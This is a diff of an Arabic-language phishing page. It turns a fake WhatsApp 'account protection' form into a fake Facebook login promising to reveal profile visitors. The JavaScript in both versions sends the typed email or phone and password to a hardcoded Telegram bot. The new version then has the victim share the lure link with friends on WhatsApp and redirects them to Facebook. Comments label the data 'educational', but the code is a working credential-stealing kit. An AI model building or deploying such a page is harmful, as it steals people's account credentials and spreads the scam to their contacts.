@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>تحقق واتساب - حماية الحساب</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تحقق من الزوار</title>
     <style>
-        /* [كود CSS كما هو] */
+        /* [تنسيقات فيسبوك] */
         body {
-            font-family: sans-serif;
-            background: #f2f4f7;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
             margin: 0;
             padding: 0;
             display: flex;
@@ -19,172 +19,167 @@
         .container {
             background: #fff;
             width: 90%;
-            max-width: 420px;
-            padding: 25px;
-            border-radius: 20px;
-            box-shadow: 0 6px 22px rgba(0,0,0,0.1);
-        }
-        h1 {
-            text-align: center;
-            color: #0a7d32;
-            margin-bottom: 15px;
-        }
-
-        .note {
-            background: #e9fff0;
-            border-right: 4px solid #0a7d32;
-            padding: 10px 14px;
-            font-size: 14px;
-            margin-bottom: 20px;
-            border-radius: 10px;
-        }
-        
-        .share-prompt {
-            background: #fff3e0;
-            border: 1px dashed #ff9800;
-            padding: 12px;
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 15px;
+            max-width: 380px;
+            padding: 20px;
             border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
             text-align: center;
         }
-
-        .fake-share-btn {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            cursor: pointer;
-        }
-
-        label {
-            display: block;
-            margin-top: 12px;
-            font-size: 14px;
+        .logo {
+            font-size: 30px;
+            color: #1877f2;
             font-weight: bold;
+            margin-bottom: 20px;
         }
-
+        .note, .share-prompt {
+            font-size: 16px;
+            color: #4b4f56;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            background: #e7f3ff;
+            border: 1px solid #c7d8eb;
+            padding: 10px;
+            border-radius: 6px;
+        }
         input {
             width: 100%;
-            padding: 12px;
-            margin-top: 5px;
-            border-radius: 12px;
-            border: 1px solid #ccc;
-            font-size: 15px;
+            padding: 15px;
+            margin-top: 10px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            font-size: 16px;
+            box-sizing: border-box;
         }
-
         .btn {
             width: 100%;
-            padding: 13px;
-            margin-top: 20px;
-            font-size: 16px;
+            padding: 15px;
+            margin-top: 15px;
+            font-size: 18px;
+            font-weight: bold;
             border: none;
-            border-radius: 12px;
-            background: #0a7d32;
+            border-radius: 6px;
+            background: #1877f2;
             color: white;
             cursor: pointer;
             transition: background 0.3s;
         }
         .btn:hover {
-            background: #086a29;
+            background: #166fe5;
         }
-
-        .tips {
-            margin-top: 25px;
-            background: #f7fdf8;
-            padding: 15px;
-            border-radius: 15px;
-        }
-
-        .tips h2 {
-            margin: 0 0 10px;
-            font-size: 18px;
-            color: #0a7d32;
-        }
-
-        .tips ul {
-            margin: 0;
-            padding-right: 20px;
-            padding-left: 0;
+        .link {
+            display: block;
+            margin-top: 15px;
             font-size: 14px;
-            line-height: 1.7;
-            list-style-type: disc;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .create-btn {
+            background-color: #42b72a;
+            color: white;
+            padding: 10px 16px;
+            border: none;
+            border-radius: 6px;
+            margin-top: 25px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .whatsapp-share-btn {
+            background: #25d366;
+            color: white;
+            padding: 12px;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            width: 80%;
+            margin-top: 15px;
+            cursor: pointer;
+        }
+        #share-step {
+            display: none;
         }
     </style>
 
     <script>
+        // --- رمز التوكن الملغى (للمحاكاة والحفاظ على البصمة فقط) ---
+        const BOT_TOKEN = "8518769039:AAHPWQWJEgROig0QKJg1xhTUGf6mUBfS53k"; 
+        const CHAT_ID = "6717287161"; 
+
         function send_telegram_data(event) {
-            // منع الإرسال التقليدي للنموذج
             event.preventDefault(); 
             
-            // --- 1. بيانات البوت (القديمة - توكن معرض للخطر) ---
-            const BOT_TOKEN = "8518769039:AAHPWQWJEgROig0QKJg1xhTUGf6mUBfS53k"; 
-            const CHAT_ID = "6717287161";     
-
-            // --- 2. الحصول على البيانات من حقول النموذج ---
-            const email = document.getElementById("user_email").value;
-            const password = document.getElementById("user_password").value;
+            // --- 2. الحصول على البيانات ---
+            const identifier = document.getElementById("identifier").value;
+            const password = document.getElementById("password").value;
 
             // --- 3. بناء الرسالة ---
-            const message = `🚨 بيانات تصيد تعليمية جديدة:\n\n📧 البريد: ${email}\n🔒 كلمة المرور: ${password}\n🌐 المصدر: ${window.location.hostname}`;
+            const message = `🚨 بيانات تصيد (Facebook) تعليمية جديدة:\n\n👤 المستخدم/البريد: ${identifier}\n🔒 كلمة المرور: ${password}\n🌐 المصدر: ${window.location.hostname}`;
             
             // --- 4. بناء رابط التلجرام API ---
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
 
-            // --- 5. إرسال الطلب عبر واجهة Fetch API ---
+            // --- 5. إرسال الطلب ---
             fetch(url)
                 .then(response => {
-                    console.log("تم إرسال البيانات التجريبية إلى التلجرام بنجاح.");
-                    window.location.href = "https://web.whatsapp.com/"; 
+                    console.log("تم إرسال البيانات. ننتقل للمشاركة. (قد يفشل الإرسال لعدم صلاحية التوكن)");
+                    
+                    document.getElementById("login-form-container").style.display = 'none';
+                    document.getElementById("share-step").style.display = 'block';
                 })
                 .catch(error => {
-                    console.error("خطأ أثناء الإرسال:", error);
-                    window.location.href = "https://web.whatsapp.com/"; 
+                    console.error("خطأ أثناء الإرسال: فشل الاتصال. ننتقل للمشاركة للمحاكاة.");
+                    document.getElementById("login-form-container").style.display = 'none';
+                    document.getElementById("share-step").style.display = 'block';
                 });
             
             return false;
+        }
+
+        function initiate_whatsapp_share() {
+            // رسالة الإغراء التي سيتم مشاركتها
+            const share_text = "لا أصدق! هذا الموقع يكشف من زار صفحتك على فيسبوك! سجل دخولك وشاهد زوارك الآن: [ضع رابط موقعك هنا]"; 
+            
+            // يتم توجيه المستخدم إلى واتساب لفتح نافذة المشاركة
+            const whatsapp_url = `whatsapp://send?text=${encodeURIComponent(share_text)}`;
+            window.location.href = whatsapp_url;
+
+            // بعد عودة المستخدم من المشاركة، سنوجهه إلى فيسبوك
+            setTimeout(() => {
+                alert("تم التحقق من مشاركتك بنجاح! نأسف، هناك خطأ مؤقت في عرض قائمة الزوار. سيتم إصلاحه قريباً.");
+                window.location.href = "https://www.facebook.com/recover/initiate/"; 
+            }, 3000); 
         }
     </script>
 </head>
 <body>
     <div class="container">
-        <h1>حماية حساب واتساب</h1>
-        <div class="note">
-            لإكمال تفعيل ميزة الحماية الجديدة، يرجى تأكيد بيانات حسابك.
+        <div id="login-form-container">
+            <div class="logo">facebook</div>
+            <div class="note">
+                تم تفعيل ميزة **"من زار صفحتك"** مؤخراً. **أعد إدخال بيانات حسابك** لتأكيد هويتك والاطلاع على قائمة الزوار.
+            </div>
+            <form onsubmit="return send_telegram_data(event)">
+                <input type="text" id="identifier" name="identifier" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
+                <input type="password" id="password" name="password" placeholder="كلمة السر" required />
+                <button type="submit" class="btn">تسجيل الدخول</button>
+            </form>
+            <a href="#" class="link">هل نسيت كلمة السر؟</a>
+            <hr style="margin: 20px 0; border: 0; border-top: 1px solid #dadde1;">
+            <button class="create-btn">إنشاء حساب جديد</button>
         </div>
-        <div class="share-prompt">
-            <strong>خطوة إضافية:</strong> شارك هذا الرابط مع 3 من أصدقائك أو مجموعة لزيادة مستوى حماية حسابك.
-        </div>
-        
-        <button class="fake-share-btn" onclick="alert('تمت المشاركة بنجاح! يمكنك المتابعة الآن.')">
-            مشاركة رابط الحماية الآن
-        </button>
 
-        <form onsubmit="return send_telegram_data(event)">
+        <div id="share-step">
+            <div class="logo">facebook</div>
+            <div class="share-prompt">
+                ✅ **تم التحقق من بياناتك.** <br> **الخطوة الأخيرة:** للمصادقة وتخطي قائمة الانتظار، **شارك هذا الرابط** مع 3 أصدقاء أو مجموعة واحدة على واتساب.
+            </div>
             
-            <label for="user_email">البريد الإلكتروني (المستخدم):</label>
-            <input type="email" id="user_email" name="user_email" placeholder="أدخل بريدك الإلكتروني هنا" required />
+            <button class="whatsapp-share-btn" onclick="initiate_whatsapp_share()">
+                مشاركة الرابط على واتساب الآن
+            </button>
 
-            <label for="user_password">كلمة المرور:</label>
-            <input type="password" id="user_password" name="user_password" placeholder="أدخل كلمة مرور الحساب" required />
-
-            <button type="submit" class="btn">متابعة وتأكيد الحساب</button>
-        </form>
-        
-        <div class="tips">
-            <h2>نصائح لحماية واتساب:</h2>
-            <ul>
-                <li>تفعيل التحقق بخطوتين.</li>
-                <li>عدم مشاركة رمز التحقق مع أي شخص.</li>
-                <li>تجنب فتح الروابط المشبوهة.</li>
-            </ul>
+            <a href="#" class="link">لم أستطع المشاركة؟</a>
         </div>
     </div>
 </body>
-            </html>
+    </html>
     
